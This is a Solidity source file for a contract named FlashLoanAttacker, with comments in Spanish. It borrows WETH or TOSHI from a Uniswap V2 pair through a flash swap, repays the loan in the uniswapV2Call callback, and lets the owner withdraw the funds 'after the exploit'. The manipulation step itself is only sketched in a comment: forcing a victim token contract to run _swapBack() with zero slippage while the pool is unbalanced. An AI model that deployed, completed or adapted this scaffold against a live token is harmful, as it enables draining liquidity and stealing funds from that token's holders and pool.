// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract FlashLoanAttacker {
    address public immutable owner;
    address public immutable uniswapRouter;
    address public immutable weth;
    address public immutable toshiToken;
    address public immutable toshiPair; // Par UniswapV2 WETH/TOSHI

    modifier onlyOwner() {
        require(msg.sender == owner, "Attacker: caller is not owner");
        _;
    }

    constructor(
        address _uniswapRouter,
        address _weth,
        address _toshiToken,
        address _toshiPair
    ) {
        owner = msg.sender;
        uniswapRouter = _uniswapRouter;
        weth = _weth;
        toshiToken = _toshiToken;
        toshiPair = _toshiPair;
    }

    /// @notice Inicia el Flash Swap pidiendo prestado WETH o TOSHI del pool de Uniswap V2
    /// @param borrowToshi True si se pide prestado TOSHI, False si se pide WETH
    /// @param amount Cantidad a pedir prestada
    function executeFlashLoan(bool borrowToshi, uint256 amount) external onlyOwner {
        address token0 = IUniswapV2Pair(toshiPair).token0();
        
        uint256 amount0Out = borrowToshi ? (token0 == toshiToken ? amount : 0) : (token0 == weth ? amount : 0);
        uint256 amount1Out = borrowToshi ? (token0 == toshiToken ? 0 : amount) : (token0 == weth ? 0 : amount);

        // Al pasar bytes con longitud > 0 (abi.encode), Uniswap V2 invoca uniswapV2Call
        bytes memory data = abi.encode(borrowToshi, amount);
        IUniswapV2Pair(toshiPair).swap(amount0Out, amount1Out, address(this), data);
    }

    /// @notice Callback ejecutado por el par de Uniswap V2 durante el swap
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external {
        // 1. Validaciones críticas de seguridad
        require(msg.sender == toshiPair, "Attacker: unauthorized callback caller");
        require(sender == address(this), "Attacker: unauthorized initiator");

        (bool borrowedToshi, uint256 amountBorrowed) = abi.decode(data, (bool, uint256));
        address borrowedToken = borrowedToshi ? toshiToken : weth;

        // ---------------------------------------------------------------------
        // 2. Lógica del exploit / manipulación de liquidez
        //    Aquí ejecutás las transferencias/swaps que fuerzan al contrato víctima
        //    a ejecutar `_swapBack()` con slippage 0 bajo un pool desbalanceado.
        // ---------------------------------------------------------------------

        // 3. Cálculo de la deuda a devolver a Uniswap V2 (0.3% fee)
        // Formula: ceil((amountBorrowed * 1000) / 997)
        uint256 fee = ((amountBorrowed * 1000) / 997) + 1;
        uint256 amountToRepay = fee;

        // 4. Pago directo al par de Uniswap
        require(
            IERC20(borrowedToken).balanceOf(address(this)) >= amountToRepay,
            "Attacker: insufficient funds to repay flash swap"
        );
        IERC20(borrowedToken).transfer(toshiPair, amountToRepay);
    }

    /// @notice Retiro de fondos acumulados tras el exploit
    function withdraw(address token) external onlyOwner {
        if (token == address(0)) {
            (bool success, ) = owner.call{value: address(this).balance}("");
            require(success, "Attacker: ETH transfer failed");
        } else {
            uint256 balance = IERC20(token).balanceOf(address(this));
            require(IERC20(token).transfer(owner, balance), "Attacker: token transfer failed");
        }
    }

    receive() external payable {}
}